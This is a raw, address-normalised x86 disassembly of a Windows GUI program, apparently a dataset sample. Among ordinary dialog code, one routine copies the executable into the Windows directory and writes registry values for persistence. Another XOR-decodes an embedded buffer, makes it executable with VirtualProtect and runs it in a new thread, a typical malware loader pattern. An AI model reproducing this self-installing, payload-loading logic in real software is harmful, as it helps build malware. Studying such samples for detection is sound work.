push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x208 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x20c ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x210 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
add esi 0x214
push 0xff
push esi
push rw-data
push edi
call sub_4246fa
pop edi
pop esi
retn 0x4
sub_41f580
push 0xffffffff
push sub_462f4f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
push 0x84
mov [ esp + 0x18 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x1c ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x98 ]
mov [ esp + 0x1c ] 0x1
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0xd4 ]
mov [ esp + 0x1c ] 0x2
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x110 ]
mov [ esp + 0x1c ] 0x3
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x14c ]
mov [ esp + 0x1c ] 0x4
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x188 ]
mov [ esp + 0x1c ] 0x5
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x1c4 ]
mov [ esp + 0x1c ] 0x6
mov ecx edi
call sub_43e388
mov [ edi ] r--data
mov ecx [ rw-data ]
lea edi [ esi + 0x204 ]
mov [ edi ] ecx
mov edx [ rw-data ]
lea ebx [ esi + 0x208 ]
mov [ ebx ] edx
mov eax [ rw-data ]
lea ebp [ esi + 0x20c ]
mov [ ebp ] eax
push 0x0
lea ecx [ esi + 0x210 ]
mov [ esp + 0x20 ] 0xa
call sub_41ffa0
push rw-data
mov ecx edi
mov [ esp + 0x20 ] 0xb
mov [ esi ] r--data
mov [ esi + 0x200 ] 0x0
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_41f710
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x1
push edi
call sub_449556
lea ecx [ esi + 0x98 ]
push ecx
push 0x3e8
push edi
call sub_449556
lea edx [ esi + 0xd4 ]
push edx
push 0x3ed
push edi
call sub_449556
lea eax [ esi + 0x110 ]
push eax
push 0x3f1
push edi
call sub_449556
lea ecx [ esi + 0x14c ]
push ecx
push 0x3ee
push edi
call sub_449556
lea edx [ esi + 0x188 ]
push edx
push 0x3e9
push edi
call sub_449556
lea eax [ esi + 0x1c4 ]
push eax
push 0x3ea
push edi
call sub_449556
lea ecx [ esi + 0x200 ]
push ecx
push 0x3f0
push edi
call sub_449443
lea edx [ esi + 0x204 ]
push edx
push 0x3e9
push edi
call sub_4493f1
lea eax [ esi + 0x208 ]
push eax
push 0x3ee
push edi
call sub_4493f1
add esi 0x20c
push esi
push 0x3ef
push edi
call sub_4493f1
pop edi
pop esi
retn 0x4
sub_41f7f0
push esi
push edi
mov esi ecx
call sub_43e113
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x0
lea ecx [ esi + 0x1c4 ]
call sub_43c126
mov eax [ esi + 0x1e0 ]
mov edi [ SendMessageA@IAT ]
push 0x20
push 0x0
push 0x1036
push eax
call edi
mov ecx [ esi + 0x1e0 ]
push 0x78
push 0x0
push 0x101e
push ecx
call edi
mov ecx esi
call sub_41f850
pop edi
mov eax 0x1
pop esi
retn
sub_41f850
push 0xffffffff
push sub_462f68
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
push esi
mov esi ecx
push edi
lea ebp [ esi + 0x1c4 ]
mov ecx ebp
call sub_441868
mov eax [ esi + 0x1e0 ]
mov edi [ SendMessageA@IAT ]
xor ebx ebx
push ebx
push ebx
push 0x1009
push eax
call edi
mov ecx [ esi + 0x1e0 ]
push ebx
push ebx
push 0xb
push ecx
call edi
mov edx [ rw-data ]
mov [ esp + 0x10 ] edx
push 0x1
mov ecx esi
mov [ esp + 0x20 ] ebx
call sub_440b18
push rw-data
lea ecx [ esp + 0x14 ]
call sub_4422d1
mov ecx [ esp + 0x10 ]
mov eax [ esi + 0x210 ]
lea edi [ esi + 0x210 ]
push ebx
push ecx
push 0xffffffff
mov ecx edi
call [ eax + 0xc ]
test eax eax
jne r-xdata
mov eax [ esi + 0x2d8 ]
test eax eax
jne r-xdata
push ebx
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
mov ecx [ esi + 0x1e0 ]
push 0x0
push 0x1
push 0xb
push ecx
call [ SendMessageA@IAT ]
mov eax [ esi + 0x320 ]
push 0x0
push 0x0
push 0x0
mov ecx ebx
push 0x0
push eax
push ecx
push 0x1
mov ecx ebp
inc ebx
call sub_43c179
mov edx [ edi ]
push 0x1
push 0x1
mov ecx edi
call [ edx + 0x14 ]
mov eax [ esi + 0x2d8 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x1c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_41f970
push 0xffffffff
push sub_462f90
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
mov eax [ rw-data ]
push esi
push edi
mov esi ecx
mov [ esp + 0x8 ] eax
push 0x1
mov [ esp + 0x1c ] 0x0
call sub_440b18
mov ecx [ esi + 0x1e0 ]
push 0x0
push 0x0
push 0x1042
push ecx
call [ SendMessageA@IAT ]
push 0x0
lea edx [ esp + 0x10 ]
push eax
push edx
lea ecx [ esi + 0x1c4 ]
call sub_43c1f0
lea edi [ esi + 0x204 ]
push eax
mov ecx edi
mov [ esp + 0x1c ] 0x1
call sub_442281
lea ecx [ esp + 0xc ]
mov [ esp + 0x18 ] 0x0
call sub_442148
mov eax [ edi ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
call sub_43b5cc
mov eax [ esp + 0x14 ]
mov edx [ esi + 0x210 ]
add esp 0xc
lea edi [ esi + 0x210 ]
mov ecx edi
push 0x0
push eax
push 0xffffffff
call [ edx + 0xc ]
test eax eax
jne r-xdata
push ebp
lea ecx [ esi + 0x324 ]
lea ebp [ esi + 0x208 ]
push ecx
mov ecx ebp
call sub_442281
push ebp
lea ecx [ esi + 0x20c ]
call sub_442281
mov edx [ esi + 0x328 ]
mov eax [ edi ]
mov ecx edi
mov [ esi + 0x200 ] edx
call [ eax + 0x10 ]
push 0x0
mov ecx esi
call sub_440b18
mov ecx [ esp + 0x28 ]
mov [ esp + 0x1c ] 0xffffffff
mov [ ecx ] 0x0
lea ecx [ esp + 0xc ]
call sub_442148
mov ecx [ esp + 0x14 ]
pop ebp
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x8
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0xffffffff
call sub_442148
pop edi
pop esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x8
sub_41fad0
push esi
mov esi ecx
push edi
push rw-data
lea ecx [ esi + 0x204 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x208 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x20c ]
call sub_4422d1
lea edi [ esi + 0x188 ]
push 0x1
mov ecx edi
mov [ esi + 0x200 ] 0x0
call sub_441841
mov ecx edi
call sub_441868
push 0x0
mov ecx esi
call sub_440b18
pop edi
pop esi
retn
sub_41fb30
push 0xffffffff
push sub_462fa8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0x204 ]
lea ebx [ esi + 0x204 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
mov ecx [ ebx ]
lea edx [ esp + 0xc ]
push ecx
push rw-data
push edx
mov [ esp + 0x24 ] 0x0
call sub_43b5cc
mov ecx [ esp + 0x18 ]
mov eax [ esi + 0x210 ]
add esp 0xc
lea edi [ esi + 0x210 ]
push 0x0
push ecx
push 0xffffffff
mov ecx edi
call [ eax + 0xc ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
mov ecx esi
call sub_43fe9c
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov edx [ edi ]
mov ecx edi
call [ edx + 0x2c ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
mov ecx esi
call sub_41f850
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
lea ecx [ esi + 0x208 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x20c ]
call sub_4422d1
push 0x0
mov ecx esi
mov [ esi + 0x200 ] 0x0
call sub_440b18
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
lea ecx [ esp + 0xc ]
mov [ esp + 0x18 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x10 ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_41fc60
push 0xffffffff
push sub_462fc8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
lea edi [ esi + 0x188 ]
mov ecx edi
call sub_441826
lea ebx [ esi + 0x204 ]
push rw-data
test eax eax
mov eax [ ebx ]
push eax
je r-xdata
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esi + 0x208 ]
lea ebp [ esi + 0x208 ]
push rw-data
push eax
call sub_42d51e
add esp 0x8
test eax eax
jne r-xdata
push eax
push eax
push rw-data
mov ecx esi
call sub_43fe9c
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push eax
push eax
push rw-data
mov ecx esi
call sub_43fe9c
mov ecx edi
call sub_441868
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi + 0x20c ]
mov ecx [ ebp ]
lea edi [ esi + 0x20c ]
push eax
push ecx
call sub_42d51e
add esp 0x8
test eax eax
je r-xdata
push eax
push eax
push rw-data
mov ecx esi
call sub_43fe9c
lea ecx [ esi + 0x14c ]
call sub_441868
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ rw-data ]
mov [ esp + 0x10 ] eax
mov ecx [ ebx ]
lea edx [ esp + 0x10 ]
push ecx
push rw-data
push edx
mov [ esp + 0x28 ] 0x0
call sub_43b5cc
mov ecx [ esp + 0x1c ]
mov eax [ esi + 0x210 ]
add esp 0xc
lea edi [ esi + 0x210 ]
push 0x0
push ecx
push 0xffffffff
mov ecx edi
call [ eax + 0xc ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
mov ecx esi
call sub_43fe9c
lea ecx [ esi + 0x14c ]
call sub_441868
push rw-data
mov ecx ebp
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
push 0x0
mov ecx esi
call sub_440b18
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
lea ecx [ esi + 0x188 ]
call sub_441826
test eax eax
mov eax [ esi + 0x2ac ]
je r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
test eax eax
jne r-xdata
test eax eax
je r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x1c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ edi ]
mov ecx edi
call [ eax + 0x24 ]
push ebx
lea ecx [ esi + 0x320 ]
call sub_442281
push ebp
lea ecx [ esi + 0x324 ]
call sub_442281
mov ecx [ esi + 0x200 ]
mov edx [ edi ]
mov [ esi + 0x328 ] ecx
mov ecx edi
call [ edx + 0x28 ]
push 0x0
push 0x0
push rw-data
mov edx [ edi ]
mov ecx edi
call [ edx + 0x10 ]
push 0x0
push 0x0
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x20 ]
push ebx
lea ecx [ esi + 0x320 ]
call sub_442281
push ebp
lea ecx [ esi + 0x324 ]
call sub_442281
mov ecx [ esi + 0x200 ]
mov edx [ edi ]
mov [ esi + 0x328 ] ecx
mov ecx edi
call [ edx + 0x28 ]
push 0x0
push 0x0
push rw-data
jmp r-xdata
mov edx [ edi ]
mov ecx edi
call [ edx + 0x10 ]
push 0x0
push 0x0
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
mov ecx esi
call sub_43fe9c
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
push 0x0
lea ecx [ esi + 0x188 ]
call sub_441841
mov ecx esi
call sub_41f850
sub_41ff30
push esi
mov esi ecx
push rw-data
lea ecx [ esi + 0x204 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x208 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x20c ]
call sub_4422d1
push 0x0
lea ecx [ esi + 0x188 ]
mov [ esi + 0x200 ] 0x0
call sub_441841
push 0x0
mov ecx esi
call sub_440b18
pop esi
retn
sub_41ffa0
push 0xffffffff
push sub_463004
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
push edi
mov esi ecx
push eax
mov [ esp + 0xc ] esi
call sub_421517
mov edx [ rw-data ]
lea ecx [ esi + 0x110 ]
mov [ esp + 0x14 ] 0x0
mov [ ecx ] edx
mov eax [ rw-data ]
lea edi [ esi + 0x114 ]
mov [ edi ] eax
push rw-data
mov [ esp + 0x18 ] 0x2
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
mov ecx [ esp + 0xc ]
mov [ esi + 0x118 ] 0x0
mov [ esi + 0x14 ] 0x3
mov [ esi + 0x8c ] 0x1
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_420090
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
push 0x0
push 0xc
lea eax [ esi + 0x110 ]
push 0xff
push eax
push rw-data
push edi
mov [ edi + 0x8 ] 0x0
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x114 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
add esi 0x118
push esi
push rw-data
push edi
call sub_424bd7
pop edi
pop esi
retn 0x4
sub_420150
mov eax [ esp + 0x8 ]
push esi
mov esi ecx
push edi
mov edi [ lstrcpynA@IAT ]
push 0x104
lea ecx [ esi + 0x104 ]
push eax
push ecx
call edi
mov edx [ esp + 0xc ]
push 0x104
push edx
push esi
call edi
pop edi
mov eax 0x1
pop esi
retn 0x8
sub_4201a0
sub esp 0x310
push ebx
push ebp
push esi
push edi
lea eax [ esp + 0x21c ]
xor ebp ebp
push 0x104
push eax
mov ebx ecx
push ebp
mov [ esp + 0x1c ] ebp
call [ GetModuleFileNameA@IAT ]
lea ecx [ esp + 0x118 ]
push 0x104
push ecx
call [ GetWindowsDirectoryA@IAT ]
lea esi [ ebx + 0x104 ]
lea edx [ esp + 0x118 ]
push esi
push edx
lea eax [ esp + 0x1c ]
push rw-data
push eax
call sub_42d7f0
mov edi [ MoveFileA@IAT ]
add esp 0x10
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x21c ]
push ecx
push edx
call edi
test eax eax
jne r-xdata
lea edx [ esp + 0x10 ]
push edx
push rw-data
push 0x80000002
call [ RegCreateKeyA@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0x118 ]
push 0x104
push eax
push rw-data
call [ GetEnvironmentVariableA@IAT ]
lea ecx [ esp + 0x118 ]
push esi
push ecx
lea edx [ esp + 0x1c ]
push rw-data
push edx
call sub_42d7f0
add esp 0x10
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x21c ]
push eax
push ecx
call edi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x310
retn
mov esi [ lstrlenA@IAT ]
mov edi [ RegSetValueExA@IAT ]
call esi
lea ecx [ esp + 0x14 ]
push eax
push ecx
push 0x1
push 0x0
push ebx
call esi
lea ecx [ esp + 0x14 ]
push eax
push ecx
push 0x1
push 0x0
push 0x0
jmp r-xdata
mov edx [ esp + 0x10 ]
push edx
call [ RegCloseKey@IAT ]
cmp ebp 0xa
jl r-xdata
mov edx [ esp + 0x24 ]
push edx
call edi
inc ebp
test eax eax
je r-xdata
push ebx
call esi
test eax eax
lea eax [ esp + 0x14 ]
push eax
jg r-xdata
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
xor ebp ebp
push eax
call [ RegCloseKey@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
push 0x80000001
call [ RegCreateKeyA@IAT ]
call esi
push eax
lea eax [ esp + 0x18 ]
push eax
push 0x1
push 0x0
push ebx
call esi
push eax
lea eax [ esp + 0x18 ]
push eax
push 0x1
push 0x0
push 0x0
jmp r-xdata
cmp ebp 0xa
jl r-xdata
mov ecx [ esp + 0x24 ]
push ecx
call edi
inc ebp
test eax eax
je r-xdata
push ebx
call esi
lea edx [ esp + 0x14 ]
test eax eax
push edx
jg r-xdata
sub_420330
push esi
mov esi ecx
mov eax 0x1
push edi
mov edi [ lstrcpyA@IAT ]
mov [ esi + 0x4 ] al
mov [ esi + 0x110 ] eax
xor eax eax
mov [ esi + 0x320 ] eax
mov [ esi + 0x114 ] eax
mov [ esi ] eax
lea eax [ esi + 0x118 ]
push rw-data
push eax
call edi
lea ecx [ esi + 0x21c ]
push rw-data
push ecx
call edi
mov eax esi
pop edi
pop esi
retn
sub_420380
push 0xffffffff
push sub_46301b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push ebp
push esi
mov ebx ecx
push 0x730
call sub_441e89
add esp 0x4
mov [ esp + 0xc ] eax
xor ebp ebp
cmp eax ebp
mov [ esp + 0x1c ] ebp
je r-xdata
push edi
lea esi [ ebx + 0x4 ]
mov ecx 0x1cc
mov edi ebp
[ edi ] [ esi ]
push 0x0
push 0x1430
push rw-data
mov ecx ebp
mov [ esp + 0x2c ] 0xffffffff
call sub_420550
push eax
call sub_441e89
add esp 0x4
mov esi eax
mov ecx ebp
push esi
push 0x1430
push rw-data
call sub_420550
lea ecx [ esp + 0x14 ]
push ecx
push 0x40
push eax
push esi
call [ VirtualProtect@IAT ]
mov edx [ ebx ]
push 0x0
push 0x0
push edx
push r-xdata
push 0x0
push 0x0
call [ CreateThread@IAT ]
call esi
mov eax [ ebx + 0x114 ]
pop edi
test eax eax
je r-xdata
mov ecx eax
call sub_420530
mov ebp eax
mov eax [ ebx + 0x320 ]
test eax eax
je r-xdata
lea eax [ ebx + 0x21c ]
lea ecx [ ebx + 0x118 ]
push eax
push ecx
mov ecx rw-data
call sub_420150
mov ecx rw-data
call sub_4201a0
mov esi [ Sleep@IAT ]
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x0
call sub_42d86f
pop esi
pop ebp
pop ebx
nop
nop
nop
nop
sub esp 0x1c
push ebx
mov ebx [ DispatchMessageA@IAT ]
push esi
mov esi [ GetMessageA@IAT ]
push edi
mov edi [ TranslateMessage@IAT ]
lea edx [ ebx + 0x630 ]
lea eax [ ebx + 0x52c ]
push edx
add ebx 0x324
push eax
push ebx
mov ecx rw-data
call sub_420670
mov ecx rw-data
call sub_4206f0
push 0x0
push 0x0
lea eax [ esp + 0x14 ]
push 0x0
push eax
call esi
test eax eax
je r-xdata
cmp [ esp + 0x10 ] 0x12
je r-xdata
push 0x0
call sub_42d86f
pop edi
pop esi
pop ebx
nop
nop
nop
nop
nop
nop
lea ecx [ esp + 0xc ]
push ecx
call edi
lea edx [ esp + 0xc ]
push edx
call ebx
jmp r-xdata
sub_420550
mov eax [ esp + 0x4 ]
mov edx ecx
push ebx
push ebp
mov ecx [ eax ]
push esi
mov [ edx + 0x108 ] ecx
mov ecx [ eax ]
mov esi [ eax + 0x4 ]
mov ebp ecx
push edi
add esi eax
lea edi [ edx + 0x1 ]
mov ebx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi [ eax + 0xc ]
mov ecx [ edx + 0x10c ]
mov ebx [ ebx + 0x8 ]
add eax edi
dec ecx
jne r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
retn 0xc
mov ecx [ esp + 0x1c ]
push ecx
push ebx
push eax
mov ecx edx
call sub_4205b0
pop edi
pop esi
pop ebp
pop ebx
retn 0xc
sub_4205b0
push esi
push edi
mov edi ecx
mov ecx [ esp + 0x14 ]
mov esi [ edi + 0x108 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0x10 ]
push ebx
xor ebx ebx
test edx edx
jbe r-xdata
mov eax [ esp + 0x10 ]
pop edi
add eax esi
pop esi
retn 0xc
pop ebx
pop edi
mov eax edx
pop esi
retn 0xc
push ebp
mov ebp [ esp + 0x14 ]
sub ebp ecx
lea eax [ edx - 0x14 ]
cmp ebx eax
jbe r-xdata
add ecx ebx
inc ebx
cmp ebx edx
jb r-xdata
push ecx
push rw-data
call sub_42d962
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
add esp 0x8
mov dl [ edi + eax + 0x1 ]
xor dl [ ecx + ebp ]
inc eax
cmp eax esi
mov [ ecx ] dl
jb r-xdata
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
xor eax eax
test esi esi
jbe r-xdata
pop ebp
sub_420670
mov eax [ esp + 0x4 ]
push esi
push edi
mov edi [ lstrcpynA@IAT ]
mov esi ecx
push 0x104
push eax
push esi
call edi
mov ecx [ esp + 0x10 ]
push 0x104
lea edx [ esi + 0x104 ]
push ecx
push edx
call edi
mov eax [ esp + 0x14 ]
push 0x104
lea ecx [ esi + 0x208 ]
push eax
push ecx
call edi
xor eax eax
mov ecx 0x1
mov [ esi + 0x314 ] eax
mov [ esi + 0x318 ] 0x10
mov [ esi + 0x31c ] ecx
mov [ esi + 0x320 ] ecx
mov [ esi + 0x324 ] eax
mov [ esi + 0x328 ] eax
mov [ esi + 0x32c ] eax
mov [ esi + 0x330 ] eax
pop edi
pop esi
retn 0xc
sub_420734
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
je r-xdata
push r--data
call [ GetModuleHandleA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
xor eax eax
cmp [ rw-data ] ebx
setne al
jmp r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] 0x1
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push 0x1
pop eax
mov [ rw-data ] eax
jmp r-xdata
sub_42080c
push esi
push edi
call sub_420734
test eax eax
je r-xdata
test [ esp + 0x10 ] 0x3
jne r-xdata
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call [ rw-data ]
jmp r-xdata
mov eax 0x12340042
mov esi [ esp + 0xc ]
xor eax eax
cmp [ esi + 0x8 ] eax
jle r-xdata
pop edi
pop esi
retn 0x8
xor eax eax
jmp r-xdata
cmp [ esi + 0xc ] eax
jle r-xdata
mov edi [ GetSystemMetrics@IAT ]
push eax
call edi
cmp [ esi ] eax
jge r-xdata
push 0x1
call edi
cmp [ esi + 0x4 ] eax
jl r-xdata
sub_420862
push ebp
mov ebp esp
sub esp 0x2c
call sub_420734
test eax eax
je r-xdata
test [ ebp + 0xc ] 0x3
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
jmp r-xdata
push [ ebp + 0x8 ]
call [ IsIconic@IAT ]
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
leave
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowRect@IAT ]
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowPlacement@IAT ]
jmp r-xdata
xor eax eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_42080c
jmp r-xdata
test eax eax
je r-xdata
sub_4208cd
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
call sub_420734
test eax eax
je r-xdata
cmp [ ebp + 0x8 ] 0x12340042
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
jmp r-xdata
xor eax eax
mov ebx [ ebp + 0xc ]
xor esi esi
cmp ebx esi
je r-xdata
pop esi
pop ebx
leave
retn 0x8
cmp [ ebx ] 0x28
jb r-xdata
lea eax [ ebp - 0x10 ]
push esi
push eax
push esi
push 0x30
call [ SystemParametersInfoA@IAT ]
test eax eax
je r-xdata
push edi
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] esi
push esi
mov esi [ GetSystemMetrics@IAT ]
call esi
push 0x1
mov [ ebx + 0xc ] eax
call esi
lea edi [ ebx + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebx ] 0x48
push 0x1
movsd [ edi ] [ esi ]
pop esi
mov [ ebx + 0x10 ] eax
mov [ ebx + 0x24 ] esi
pop edi
jb r-xdata
mov eax esi
jmp r-xdata
add ebx 0x28
push r--data
push ebx
call [ lstrcpyA@IAT ]
sub_4209c9
mov eax sub_463205
call sub_42dc88
push ecx
push esi
push edi
push 0x14
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
test ecx ecx
je r-xdata
xor esi esi
push edi
call sub_420a4d
mov esi eax
jmp r-xdata
cmp di 0x3e8
jle r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp di 0xffff
jne r-xdata
lea eax [ ebp + 0xc ]
push r--data
push eax
mov [ ebp + 0xc ] esi
call sub_42dca7
pop edi
pop esi
cmp di 0x405
jge r-xdata
mov eax [ esi ]
push 0x1
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
call [ eax + 0x14 ]
jmp r-xdata
movsx eax di
add eax 0xee98
lea ecx [ esi + 0xc ]
push eax
call sub_4437c6
sub_420a4d
push esi
mov esi ecx
call sub_442f71
mov eax [ rw-data ]
mov [ esi + 0xc ] eax
mov eax [ rw-data ]
mov [ esi + 0x10 ] eax
mov ax [ esp + 0x8 ]
mov [ esi + 0x8 ] ax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_420a96
mov eax sub_463223
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
lea ecx [ esi + 0x10 ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0xc ]
call sub_442148
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_420ad5
mov eax sub_463260
call sub_42dc88
sub esp 0x260
push esi
mov esi [ ebp + 0x8 ]
test esi esi
mov [ ebp - 0x24 ] ecx
je r-xdata
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
mov eax [ rw-data ]
push ebx
push edi
mov [ ebp - 0x10 ] eax
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] eax
push sub_453261
mov ecx rw-data
mov [ ebp - 0x4 ] 0x1
call sub_455223
lea ecx [ ebp - 0x16 ]
mov edi 0x1ff
push ecx
lea ecx [ ebp - 0x26c ]
push edi
push ecx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x28 ] eax
push ecx
